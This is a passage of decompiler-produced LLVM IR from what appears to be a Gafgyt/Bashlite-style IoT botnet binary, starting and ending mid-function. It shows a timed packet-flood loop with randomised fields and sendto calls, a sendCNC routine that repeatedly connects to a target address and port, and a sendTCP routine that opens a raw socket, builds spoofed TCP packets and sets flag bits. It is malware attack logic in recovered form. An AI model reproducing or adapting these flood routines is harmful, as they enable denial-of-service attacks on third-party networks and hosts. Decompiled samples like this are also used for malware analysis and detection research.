  %v0_804ee71 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee71 = load i32, i32* @esp, align 4
  %v2_804ee71 = inttoptr i32 %v1_804ee71 to i32*
  store i32 %v0_804ee71, i32* %v2_804ee71, align 4
  %v4_804ee74 = inttoptr i32 %v4_804ee3c to i16*
  %v5_804ee74 = call i32 @csum(i16* %v4_804ee74, i32 %v3_804ee5c)
  %v1_804ee79 = urem i32 %v5_804ee74, 65536
  store i32 %v1_804ee79, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v1_804ee7f = trunc i32 %v5_804ee74 to i16
  %v3_804ee7f = or i32 %v2_804ed8b, 10
  %v4_804ee7f = inttoptr i32 %v3_804ee7f to i16*
  store i16 %v1_804ee7f, i16* %v4_804ee7f, align 2
  %v0_804ee83 = load i32, i32* @esp, align 4
  %v1_804ee83 = inttoptr i32 %v0_804ee83 to i32*
  store i32 0, i32* %v1_804ee83, align 4
  %v2_804ee8a = inttoptr i32 %v4_804ee3c to i32*
  %v3_804ee8a = call i32 @__GI_time(i32* %v2_804ee8a)
  %v5_804ee8f = add i32 %v3_804ee8a, %arg3
  store i32 %v5_804ee8f, i32* %eax.global-to-local, align 4
  %v3_804ef18 = or i32 %v2_804ed8b, 4
  %v4_804ef18 = inttoptr i32 %v3_804ef18 to i16*
  %v2_804ef34 = or i32 %v2_804ed8b, 12
  %v3_804ef34 = inttoptr i32 %v2_804ef34 to i32*
  br label %dec_label_pc_804ee9e

dec_label_pc_804ee9e:                             ; preds = %dec_label_pc_804ef61, %dec_label_pc_804ef7e, %dec_label_pc_804ee39
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_804ee39 ], [ %v4_804ef7e, %dec_label_pc_804ef7e ], [ 0, %dec_label_pc_804ef61 ]
  %stack_var_-96.0 = phi i16 [ %tmp, %dec_label_pc_804ee39 ], [ %storemerge, %dec_label_pc_804ef7e ], [ %storemerge, %dec_label_pc_804ef61 ]
  store i32 %v2_804ed8b, i32* %edx.global-to-local, align 4
  %v0_804eea4 = load i32, i32* @esp, align 4
  %v1_804eea4 = add i32 %v0_804eea4, 20
  %v2_804eea4 = inttoptr i32 %v1_804eea4 to i32*
  store i32 16, i32* %v2_804eea4, align 4
  %v1_804eeac = load i32, i32* @esp, align 4
  %v2_804eeac = add i32 %v1_804eeac, 16
  %v3_804eeac = inttoptr i32 %v2_804eeac to i32*
  store i32 %v2_804eb2c, i32* %v3_804eeac, align 4
  %v0_804eeb0 = load i32, i32* @esp, align 4
  %v1_804eeb0 = add i32 %v0_804eeb0, 12
  %v2_804eeb0 = inttoptr i32 %v1_804eeb0 to i32*
  store i32 0, i32* %v2_804eeb0, align 4
  %v1_804eebb = load i32, i32* @esp, align 4
  %v2_804eebb = add i32 %v1_804eebb, 8
  %v3_804eebb = inttoptr i32 %v2_804eebb to i32*
  store i32 %v1_804ed67, i32* %v3_804eebb, align 4
  %v0_804eebf = load i32, i32* %edx.global-to-local, align 4
  %v1_804eebf = load i32, i32* @esp, align 4
  %v2_804eebf = add i32 %v1_804eebf, 4
  %v3_804eebf = inttoptr i32 %v2_804eebf to i32*
  store i32 %v0_804eebf, i32* %v3_804eebf, align 4
  store i32 %v5_804ec8c, i32* %eax.global-to-local, align 4
  %v1_804eec6 = load i32, i32* @esp, align 4
  %v2_804eec6 = inttoptr i32 %v1_804eec6 to i32*
  store i32 %v5_804ec8c, i32* %v2_804eec6, align 4
  %v6_804eec9 = call i32 @__libc_sendto(i32 %stack_var_-80.0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804eec9, i32* %eax.global-to-local, align 4
  %v1_804eece = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  %v1_804eed3 = urem i32 %v1_804eece, 65536
  store i32 %v1_804eed3, i32* %edx.global-to-local, align 4
  store i32 %v1_804eda3, i32* %eax.global-to-local, align 4
  %v1_804eed9 = trunc i32 %v1_804eece to i16
  store i16 %v1_804eed9, i16* %v5_804eda6, align 4
  br i1 %v1_804eb07, label %dec_label_pc_804eeef, label %dec_label_pc_804eee2

dec_label_pc_804eee2:                             ; preds = %dec_label_pc_804ee9e
  %v1_804eee2 = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  br label %dec_label_pc_804ef03

dec_label_pc_804eeef:                             ; preds = %dec_label_pc_804ee9e
  store i32 %v1_804eef2.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804eef5 = load i32, i32* @esp, align 4
  %v2_804eef5 = inttoptr i32 %v1_804eef5 to i32*
  store i32 %v1_804eef2.pre-phi, i32* %v2_804eef5, align 4
  %v3_804eef8 = call i32 @htons(i16 %stack_var_-96.0)
  br label %dec_label_pc_804ef03

dec_label_pc_804ef03:                             ; preds = %dec_label_pc_804eee2, %dec_label_pc_804eeef
  %storemerge11.in = phi i32 [ %v1_804eee2, %dec_label_pc_804eee2 ], [ %v3_804eef8, %dec_label_pc_804eeef ]
  %storemerge = trunc i32 %storemerge11.in to i16
  store i32 %v1_804eda3, i32* %eax.global-to-local, align 4
  %sext12 = mul i32 %storemerge11.in, 65536
  %v4_804ef06 = sdiv i32 %sext12, 65536
  store i32 %v4_804ef06, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804ee3f, align 2
  %v2_804ef0d = call i32 @rand_cmwc(i32 %v4_804ef06)
  %v1_804ef12 = urem i32 %v2_804ef0d, 65536
  store i32 %v1_804ef12, i32* %edx.global-to-local, align 4
  %v1_804ef18 = trunc i32 %v2_804ef0d to i16
  store i16 %v1_804ef18, i16* %v4_804ef18, align 4
  store i32 %storemerge8, i32* @eax, align 4
  %v1_804ef1f = load i32, i32* @esp, align 4
  %v2_804ef1f = inttoptr i32 %v1_804ef1f to i32*
  store i32 %storemerge8, i32* %v2_804ef1f, align 4
  %v2_804ef22 = call i32 @HackerScan2(i32 %v4_804ef06)
  store i32 %v2_804ef22, i32* %eax.global-to-local, align 4
  %v1_804ef27 = load i32, i32* @esp, align 4
  %v2_804ef27 = inttoptr i32 %v1_804ef27 to i32*
  store i32 %v2_804ef22, i32* %v2_804ef27, align 4
  %v0_804ef2a = call i32 @htonl()
  store i32 %v0_804ef2a, i32* %edx.global-to-local, align 4
  store i32 %v0_804ef2a, i32* %v3_804ef34, align 4
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v3_804ef3a = load i16, i16* %v2_804ee64, align 2
  %v4_804ef3a = zext i16 %v3_804ef3a to i32
  store i32 %v4_804ef3a, i32* %edx.global-to-local, align 4
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v1_804ef43 = load i32, i32* @esp, align 4
  %v2_804ef43 = add i32 %v1_804ef43, 4
  %v3_804ef43 = inttoptr i32 %v2_804ef43 to i32*
  store i32 %v4_804ef3a, i32* %v3_804ef43, align 4
  %v0_804ef47 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef47 = load i32, i32* @esp, align 4
  %v2_804ef47 = inttoptr i32 %v1_804ef47 to i32*
  store i32 %v0_804ef47, i32* %v2_804ef47, align 4
  %v3_804ef4a = inttoptr i32 %v4_804ef06 to i16*
  %v4_804ef4a = call i32 @csum(i16* %v3_804ef4a, i32 %v13_804eafa)
  %v1_804ef4f = urem i32 %v4_804ef4a, 65536
  store i32 %v1_804ef4f, i32* %edx.global-to-local, align 4
  %v1_804ef55 = trunc i32 %v4_804ef4a to i16
  store i16 %v1_804ef55, i16* %v4_804ee7f, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804ef5c = icmp eq i32 %stack_var_-80.0, %arg6
  %v1_804ef5f = icmp eq i1 %v15_804ef5c, false
  br i1 %v1_804ef5f, label %dec_label_pc_804ef7e, label %dec_label_pc_804ef61

dec_label_pc_804ef61:                             ; preds = %dec_label_pc_804ef03
  %v0_804ef61 = load i32, i32* @esp, align 4
  %v1_804ef61 = inttoptr i32 %v0_804ef61 to i32*
  store i32 0, i32* %v1_804ef61, align 4
  %v2_804ef68 = inttoptr i32 %v4_804ef06 to i32*
  %v3_804ef68 = call i32 @__GI_time(i32* %v2_804ef68)
  store i32 %v3_804ef68, i32* %eax.global-to-local, align 4
  %v8_804ef70 = icmp sgt i32 %v3_804ef68, %v5_804ee8f
  br i1 %v8_804ef70, label %dec_label_pc_804ef86, label %dec_label_pc_804ee9e

dec_label_pc_804ef7e:                             ; preds = %dec_label_pc_804ef03
  %v4_804ef7e = add i32 %stack_var_-80.0, 1
  br label %dec_label_pc_804ee9e

dec_label_pc_804ef86:                             ; preds = %dec_label_pc_804ef61, %dec_label_pc_804ece9, %dec_label_pc_804ec9a
  %v0_804ef8f22 = phi i32 [ %v4_804ecf9, %dec_label_pc_804ece9 ], [ %v4_804ecaa, %dec_label_pc_804ec9a ], [ %v3_804ef68, %dec_label_pc_804ef61 ]
  br label %dec_label_pc_804ef89

dec_label_pc_804ef89:                             ; preds = %dec_label_pc_804ec4d, %dec_label_pc_804ebab, %dec_label_pc_804eb2c, %dec_label_pc_804eb91, %dec_label_pc_804ef86
  %v0_804ef8f = phi i32 [ 0, %dec_label_pc_804ebab ], [ %v5_804eb3c, %dec_label_pc_804eb2c ], [ %v4_804eba1, %dec_label_pc_804eb91 ], [ %v0_804ef8f22, %dec_label_pc_804ef86 ], [ %v3_804ec54, %dec_label_pc_804ec4d ]
  store i32 %v0_804eaf9, i32* @ebx, align 4
  ret i32 %v0_804ef8f

; uselistorder directives
  uselistorder i32 %v4_804ef4a, { 1, 0 }
  uselistorder i32 %v2_804ef0d, { 1, 0 }
  uselistorder i32 %v4_804ef06, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v1_804eece, { 1, 0 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v5_804ee74, { 1, 0 }
  uselistorder i32 %v4_804ee3c, { 2, 1, 0 }
  uselistorder i32 %v1_804eef2.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ee28, { 2, 1, 0 }
  uselistorder i32 %v2_804ee04, { 1, 0 }
  uselistorder i32 %v3_804edf5, { 1, 0 }
  uselistorder i32 %v1_804edef, { 1, 0 }
  uselistorder i32 %v2_804ed8b, { 9, 8, 7, 17, 16, 15, 6, 5, 14, 4, 13, 12, 11, 10, 2, 3, 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804ed5d, { 1, 0 }
  uselistorder i32 %v5_804ec8c, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i8* %v1_804ebcd, { 1, 0, 2 }
  uselistorder i32 %v2_804ebb2, { 1, 2, 0, 4, 3, 5, 6 }
  uselistorder i32 %v1_804ebae, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_804eb83, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804eb2c, { 1, 0 }
  uselistorder i32 %v1_804eb1a, { 1, 0 }
  uselistorder i8** %stack_var_-140, { 16, 15, 18, 14, 13, 12, 11, 10, 9, 17, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 6, 4, 5, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 30, 29, 31, 32, 34, 33, 36, 35, 39, 37, 38, 42, 40, 41, 44, 43, 45, 46, 47, 48, 50, 49, 51 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ef89, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ef03, { 1, 0 }
  uselistorder label %dec_label_pc_804ee9e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ee39, { 1, 0 }
  uselistorder label %dec_label_pc_804ed64, { 1, 0 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_804ed0c, { 1, 0 }
  uselistorder label %dec_label_pc_804ec4d, { 1, 0 }
  uselistorder label %dec_label_pc_804ec03, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804eb2c, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ef90 = load i32, i32* @ebp, align 4
  store i32 %v0_804ef90, i32* %stack_var_-4, align 4
  %v4_804ef90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ef90, i32* @ebp, align 4
  %v2_804ef9d = call i32 @__GI_time(i32* null)
  %v5_804efa2 = add i32 %v2_804ef9d, %arg3
  %v1_804efae = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804efc5 = trunc i32 %arg2 to i16
  %v2_804efc5 = call i32 @htons(i16 %v1_804efc5)
  %v4_804effd = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804f023

dec_label_pc_804efd3:                             ; preds = %dec_label_pc_804f023
  %v3_804efea = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_804f007 = call i32 @__libc_connect(i32 %v3_804efea, i32 %v4_804effd, i32 16)
  %v1_804f013 = call i32 @sleep(i32 1)
  %v1_804f01e = call i32 @__libc_close(i32 %v3_804efea)
  br label %dec_label_pc_804f023

dec_label_pc_804f023:                             ; preds = %entry, %dec_label_pc_804efd3
  %v2_804f02a = call i32 @__GI_time(i32* null)
  %v5_804f032 = icmp slt i32 %v2_804f02a, %v5_804efa2
  br i1 %v5_804f032, label %dec_label_pc_804efd3, label %dec_label_pc_804f034

dec_label_pc_804f034:                             ; preds = %dec_label_pc_804f023
  %v2_804f034 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f034, i32* @ebp, align 4
  ret i32 %v2_804f02a

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder label %dec_label_pc_804f023, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp40 = call i16 @__decompiler_undefined_function_4()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i8*, align 4
  %v0_804f03a = load i32, i32* @esi, align 4
  %v0_804f03b = load i32, i32* @ebx, align 4
  %v15_804f03c = ptrtoint i8** %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f053 = icmp eq i32 %arg2, 0
  %v1_804f057 = icmp eq i1 %v4_804f053, false
  br i1 %v1_804f057, label %dec_label_pc_804f067, label %dec_label_pc_804f059

dec_label_pc_804f059:                             ; preds = %entry
  %v1_804f059 = call i32 @rand_cmwc(i32 %v15_804f03c)
  br label %dec_label_pc_804f07c

dec_label_pc_804f067:                             ; preds = %entry
  %v1_804f06a = urem i32 %arg2, 65536
  store i32 %v1_804f06a, i32* %eax.global-to-local, align 4
  %v4_804f06d = inttoptr i32 %v1_804f06a to i8*
  store i8* %v4_804f06d, i8** %stack_var_-188, align 4
  %v2_804f070 = trunc i32 %arg2 to i16
  %v3_804f070 = call i32 @htons(i16 %v2_804f070)
  br label %dec_label_pc_804f07c

dec_label_pc_804f07c:                             ; preds = %dec_label_pc_804f059, %dec_label_pc_804f067
  %v2_804f07c = ptrtoint i32* %stack_var_-60 to i32
  %v5_804f07f = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804f07f, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804f089 = inttoptr i32 %arg1 to i8*
  store i8* %v4_804f089, i8** %stack_var_-188, align 4
  %v5_804f08c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v5_804f08c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f091 = icmp eq i32 %v5_804f08c, 0
  br i1 %v1_804f091, label %dec_label_pc_804f09a, label %dec_label_pc_804f5f3

dec_label_pc_804f09a:                             ; preds = %dec_label_pc_804f07c
  %v5_804f09d = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804f09d, i1* %cf.global-to-local, align 1
  %v15_804f09d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804f09d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-188, align 4
  %v5_804f0c4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v5_804f0c4, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f0cc = icmp eq i32 %v5_804f0c4, 0
  %v1_804f0d0 = icmp eq i1 %v4_804f0cc, false
  br i1 %v1_804f0d0, label %dec_label_pc_804f0ec, label %dec_label_pc_804f0d2

dec_label_pc_804f0d2:                             ; preds = %dec_label_pc_804f09a
  %v0_804f0d2 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804f0d2 = ptrtoint i8* %v0_804f0d2 to i32
  store i32 %v1_804f0d2, i32* %eax.global-to-local, align 4
  store i8* %v0_804f0d2, i8** %stack_var_-188, align 4
  %v4_804f0e2 = call i32 @HackerPrint(i32 %v1_804f0d2, i32 ptrtoint ([27 x i8]* @global_var_805d2d0.856 to i32))
  store i32 %v4_804f0e2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5f3

dec_label_pc_804f0ec:                             ; preds = %dec_label_pc_804f09a
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804f0fb = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v5_804f0c4, i32* %eax.global-to-local, align 4
  %v4_804f115 = inttoptr i32 %v5_804f0c4 to i8*
  store i8* %v4_804f115, i8** %stack_var_-188, align 4
  %v7_804f118 = call i32 @__GI_setsockopt(i32 %v5_804f0c4, i32 0, i32 3, i32 %v2_804f0fb, i32 4)
  store i32 %v7_804f118, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f11d = icmp slt i32 %v7_804f118, 0
  %v1_804f11f = icmp eq i1 %v2_804f11d, false
  br i1 %v1_804f11f, label %dec_label_pc_804f13b, label %dec_label_pc_804f121

dec_label_pc_804f121:                             ; preds = %dec_label_pc_804f0ec
  %v0_804f121 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804f121 = ptrtoint i8* %v0_804f121 to i32
  store i32 %v1_804f121, i32* %eax.global-to-local, align 4
  store i8* %v0_804f121, i8** %stack_var_-188, align 4
  %v4_804f131 = call i32 @HackerPrint(i32 %v1_804f121, i32 ptrtoint ([33 x i8]* @global_var_805d2ec.857 to i32))
  store i32 %v4_804f131, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5f3

dec_label_pc_804f13b:                             ; preds = %dec_label_pc_804f0ec
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f13b = icmp eq i32 %arg4, 0
  %v1_804f13f = icmp eq i1 %v4_804f13b, false
  br i1 %v1_804f13f, label %dec_label_pc_804f14a, label %dec_label_pc_804f160

dec_label_pc_804f14a:                             ; preds = %dec_label_pc_804f13b
  %v5_804f151 = sub i32 32, %arg4
  %v10_804f151 = icmp ugt i32 %arg4, 32
  store i1 %v10_804f151, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804f159 = urem i32 %v5_804f151, 32
  %v4_804f159 = icmp eq i32 %v2_804f159, 0
  br i1 %v4_804f159, label %bb91, label %bb

bb:                                               ; preds = %dec_label_pc_804f14a
  %v5_804f159 = shl i32 1, %v2_804f159
  store i32 %v5_804f159, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_804f14a, %bb
  %v0_804f15b = phi i32 [ 1, %dec_label_pc_804f14a ], [ %v5_804f159, %bb ]
  %v1_804f15b = sub i32 0, %v0_804f15b
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804f15b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f160

dec_label_pc_804f160:                             ; preds = %dec_label_pc_804f13b, %bb91
  %storemerge11 = phi i32 [ %v1_804f15b, %bb91 ], [ 0, %dec_label_pc_804f13b ]
  %v1_804f163 = add i32 %arg6, 40
  %v1_804f16f = add i32 %arg6, 70
  %v2_804f172 = and i32 %v1_804f16f, -16
  %v0_804f178 = load i32, i32* @esp, align 4
  %v2_804f178 = sub i32 %v0_804f178, %v2_804f172
  %v1_804f17a = add i32 %v2_804f178, 24
  store i32 %v1_804f17a, i32* %edx.global-to-local, align 4
  %v1_804f184 = add i32 %v2_804f178, 39
  %v2_804f187 = and i32 %v1_804f184, -16
  %v1_804f19f = add i32 %v2_804f187, 20
  %v5_804f1a2 = inttoptr i32 %v1_804f19f to i16*
  %v1_804f1a8 = add i32 %arg6, 20
  %v5_804f1a8 = icmp ugt i32 %arg6, -21
  store i1 %v5_804f1a8, i1* %cf.global-to-local, align 1
  store i32 %v1_804f1a8, i32* @ebx, align 4
  store i32 %storemerge11, i32* @eax, align 4
  %v2_804f1b0 = inttoptr i32 %v2_804f178 to i32*
  store i32 %storemerge11, i32* %v2_804f1b0, align 4
  %v1_804f1b3 = call i32 @HackerScan2(i32 %v1_804f163)
  store i32 %v1_804f1b3, i32* %eax.global-to-local, align 4
  %v1_804f1b8 = load i32, i32* @esp, align 4
  %v2_804f1b8 = inttoptr i32 %v1_804f1b8 to i32*
  store i32 %v1_804f1b3, i32* %v2_804f1b8, align 4
  %v0_804f1bb = call i32 @htonl()
  %v3_804f1c0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804f1c0, i32* %edx.global-to-local, align 4
  %v0_804f1c3 = load i32, i32* @ebx, align 4
  %v1_804f1c3 = load i32, i32* @esp, align 4
  %v2_804f1c3 = add i32 %v1_804f1c3, 16
  %v3_804f1c3 = inttoptr i32 %v2_804f1c3 to i32*
  store i32 %v0_804f1c3, i32* %v3_804f1c3, align 4
  %v0_804f1c7 = load i32, i32* @esp, align 4
  %v1_804f1c7 = add i32 %v0_804f1c7, 12
  %v2_804f1c7 = inttoptr i32 %v1_804f1c7 to i32*
  store i32 6, i32* %v2_804f1c7, align 4
  %v1_804f1cf = load i32, i32* @esp, align 4
  %v2_804f1cf = add i32 %v1_804f1cf, 8
  %v3_804f1cf = inttoptr i32 %v2_804f1cf to i32*
  store i32 %v0_804f1bb, i32* %v3_804f1cf, align 4
  %v0_804f1d3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f1d3 = load i32, i32* @esp, align 4
  %v2_804f1d3 = add i32 %v1_804f1d3, 4
  %v3_804f1d3 = inttoptr i32 %v2_804f1d3 to i32*
  store i32 %v0_804f1d3, i32* %v3_804f1d3, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f1da = load i32, i32* @esp, align 4
  %v2_804f1da = inttoptr i32 %v1_804f1da to i32*
  store i32 %v2_804f187, i32* %v2_804f1da, align 4
  %v0_804f1dd = call i32 @makeIPPacket()
  store i32 %v0_804f1dd, i32* %eax.global-to-local, align 4
  %v2_804f1e2 = call i32 @rand_cmwc(i32 %v1_804f19f)
  %v1_804f1e7 = urem i32 %v2_804f1e2, 65536
  store i32 %v1_804f1e7, i32* %edx.global-to-local, align 4
  store i32 %v1_804f19f, i32* %eax.global-to-local, align 4
  %v1_804f1ed = trunc i32 %v2_804f1e2 to i16
  store i16 %v1_804f1ed, i16* %v5_804f1a2, align 4
  %v2_804f1f0 = call i32 @rand_cmwc(i32 %v1_804f19f)
  %v2_804f1fa = add i32 %v2_804f187, 24
  %v3_804f1fa = inttoptr i32 %v2_804f1fa to i32*
  store i32 %v2_804f1f0, i32* %v3_804f1fa, align 8
  store i32 %v1_804f19f, i32* %eax.global-to-local, align 4
  %v1_804f200 = add i32 %v2_804f187, 28
  %v2_804f200 = inttoptr i32 %v1_804f200 to i32*
  store i32 0, i32* %v2_804f200, align 4
  store i32 %v1_804f19f, i32* %edx.global-to-local, align 4
  %v1_804f20a = add i32 %v2_804f187, 32
  %v2_804f20a = inttoptr i32 %v1_804f20a to i8*
  %v3_804f20a = load i8, i8* %v2_804f20a, align 16
  %v2_804f20e = urem i8 %v3_804f20a, 16
  %v2_804f210 = or i8 %v2_804f20e, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804f210, i8* %v2_804f20a, align 16
  %v4_804f215 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804f215, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f215, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d30d.858 to i32), i32* @edi, align 4
  %v7_804f233 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d30d.858, i32 0, i32 0), i32 4)
  %v8_804f233 = urem i32 %v7_804f233, 2
  %v9_804f233 = icmp eq i32 %v8_804f233, 0
  %v0_804f235 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f235 = or i1 %v0_804f235, %v9_804f233
  %v3_804f235 = zext i1 %v2_804f235 to i32
  %v4_804f235 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f235 = and i32 %v4_804f235, -256
  %v6_804f235 = or i32 %v3_804f235, %v5_804f235
  %v7_804f235 = xor i32 %v6_804f235, 1
  store i32 %v7_804f235, i32* @edx, align 4
  %v3_804f23b = and i32 %v7_804f233, -256
  %v1_804f23d = trunc i32 %v7_804f235 to i8
  %v3_804f23d = zext i1 %v0_804f235 to i8
  %v4_804f23d = sub nsw i8 %v1_804f23d, %v3_804f23d
  %v15_804f23d = icmp eq i8 %v4_804f23d, 0
  %v20_804f23d = zext i8 %v4_804f23d to i32
  %v23_804f23d = or i32 %v20_804f23d, %v3_804f23b
  store i32 %v23_804f23d, i32* @ecx, align 4
  %v2_804f241 = sext i8 %v4_804f23d to i32
  store i32 %v2_804f241, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f246 = icmp eq i1 %v15_804f23d, false
  br i1 %v1_804f246, label %dec_label_pc_804f289, label %dec_label_pc_804f248

dec_label_pc_804f248:                             ; preds = %dec_label_pc_804f160
  store i32 %v1_804f19f, i32* %edx.global-to-local, align 4
  %v1_804f24b = add i32 %v2_804f187, 33
  %v2_804f24b = inttoptr i32 %v1_804f24b to i8*
  %v3_804f24b = load i8, i8* %v2_804f24b, align 1
  %v2_804f24f = or i8 %v3_804f24b, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f24f = zext i8 %v2_804f24f to i32
  store i32 %v7_804f24f, i32* %eax.global-to-local, align 4
  store i8 %v2_804f24f, i8* %v2_804f24b, align 1
  store i32 %v1_804f19f, i32* %edx.global-to-local, align 4
  %v3_804f257 = load i8, i8* %v2_804f24b, align 1
  %v2_804f25b = or i8 %v3_804f257, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f25b = zext i8 %v2_804f25b to i32
  store i32 %v7_804f25b, i32* %eax.global-to-local, align 4
  store i8 %v2_804f25b, i8* %v2_804f24b, align 1
  store i32 %v1_804f19f, i32* %edx.global-to-local, align 4
  %v3_804f263 = load i8, i8* %v2_804f24b, align 1
  %v2_804f267 = or i8 %v3_804f263, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f267 = zext i8 %v2_804f267 to i32
  store i32 %v7_804f267, i32* %eax.global-to-local, align 4
  store i8 %v2_804f267, i8* %v2_804f24b, align 1
  store i32 %v1_804f19f, i32* %edx.global-to-local, align 4
  %v3_804f26f = load i8, i8* %v2_804f24b, align 1
  %v2_804f273 = or i8 %v3_804f26f, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f273 = zext i8 %v2_804f273 to i32
  store i32 %v7_804f273, i32* %eax.global-to-local, align 4
  store i8 %v2_804f273, i8* %v2_804f24b, align 1
  store i32 %v1_804f19f, i32* %edx.global-to-local, align 4
  %v3_804f27b = load i8, i8* %v2_804f24b, align 1
  %v2_804f27f = or i8 %v3_804f27b, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f27f = zext i8 %v2_804f27f to i32
  store i32 %v7_804f27f, i32* %eax.global-to-local, align 4
  store i8 %v2_804f27f, i8* %v2_804f24b, align 1
  %v0_804f45f.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804f45f

